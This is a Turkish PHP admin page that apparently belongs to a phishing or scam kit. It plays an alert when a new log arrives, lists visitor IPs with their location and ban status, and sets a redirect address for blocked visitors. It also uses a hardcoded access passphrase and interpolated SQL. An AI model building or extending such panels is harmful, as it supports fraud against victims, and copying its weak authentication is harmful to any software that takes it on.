<?php
session_start();
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();
include "../config.php";

if($_SESSION["ipx"] != $ipcik)  { 
   header("location:cikis.php"); 
 }


$gtc = $_SESSION["username"];
$sorgu = $connect->prepare("SELECT * FROM icq WHERE mail = ?");
$sorgu->bindParam(1, $gtc, PDO::PARAM_INT);
$sorgu->execute();
$cikti = $sorgu->fetch(PDO::FETCH_ASSOC);




$idx = $_GET['idx'];
$islem = $_GET['islem'];

$bildirim = $connect->query("SELECT * FROM gtm WHERE notif = '1'")->fetch(PDO::FETCH_ASSOC);

if ( $bildirim ){
    $id = $bildirim['id'];
   echo '<div id="alerts">
			<audio id="audioplayer" autoplay=true>
			<source src="assets/log.mp3" type="audio/mpeg">
			Tarayiciniz ses elementlerini desteklemiyor. </audio>
			</div>';
	$guncelleme = $connect->exec("UPDATE gtm Set notif='0', ses='0' WHERE id='$id'");

}
function loginkontrol (){
    if(empty($_SESSION["username"])){
        header("location:bos.html");
        exit;
    }
}
$idx = "1";
$stmt = $connect->prepare("SELECT count(*) FROM ban WHERE durum = ?");
$stmt->execute([$idx]);
$count = $stmt->fetchColumn();
$countx = $connect->query("SELECT count(*) FROM ban")->fetchColumn();

?>
 <?php 
 
    if ($_POST['krx']=="283127161617283812112811") {?>
    <?php
    loginkontrol ();
    ?>
     <div class="container">
		<div class="card-group">
      <div class="card">
        <a href="#" class="pull-xs-left p-absolute p-a-1 text-muted"><i class="material-icons" style="color: red;">description</i></a>
        <div class="card-block center" style="background-color: black;">
          <h2 class="m-b-0">
            <strong style="color: white;"><?php echo $countx; ?></strong>
          </h2>
          <small class="text-muted" style="color: white;">Toplam Ziyaretçi</small>
        </div>
      </div>
      <div class="card">
        <a href="#" class="pull-xs-left p-absolute p-a-1 text-muted"><i class="material-icons" style="color: black;">gavel</i></a>
        <div class="card-block center"  style="background-color: red;">
          <h2 class="m-b-0">
            <strong><?php echo $count; ?></strong>
          </h2>
          <small class="text-muted" style="color: white;">Banlanan</small>
        </div>
      </div>
     
    </div>
	
	 <div class="card" style="padding: 10px; background-color: black;">
        <form method="get" action="assets/frs.php">
		<label style="color: white;">Ban yönlendirme adresi</label>
			<input type="text" name="sitex" value="<?php echo $site ?>">
			<input type="hidden" name="connect" value="6cba">
		<button class="btn btn-success btn-rounded" type="submit">Guncelle</button>
		    <a class="btn btn-danger btn-rounded" href="assets/frs.php?connect=<?php echo 'abc6'; ?>">Sıfırla</a>

		 </form>
      </div>	 
	
  <div class="card">
        <table class="table">
          <thead>
            <tr>
              <th>#</th>
              <th>İp</th>
              <th>Ülke / Şehir</th>
              <th>Durum</th>
            </tr>
          </thead>
          <tbody>
            <?php
      $logsorgu = $connect->prepare("SELECT * FROM ban order by id DESC");
            $logsorgu->execute();
            while ($loglar = $logsorgu->fetch(PDO::FETCH_ASSOC)) {?>
            <tr class="table-active" <?php if($loglar["durum"] == "1"){?> style="color: red;"<?php } else {?>style="color: green;" <?php }	 ?> >
              <th scope="row" ><?php echo $loglar["id"]; ?></th>
              <td><?php echo $loglar["ip"]; ?></td>
              <td><?php echo $loglar["ulke"]; ?> / <?php echo $loglar["sehir"]; ?></td>
              <td><?php if($loglar["durum"] == "1"){?> 
						ENGELLENDİ
							<?php } else {?> 
						İZİN VERİLDİ
						<?php }	 ?></td>
              </tr>
           
          </tbody>
          <?php } ?>
        </table>
      </div>
  </div>

   <?php }


     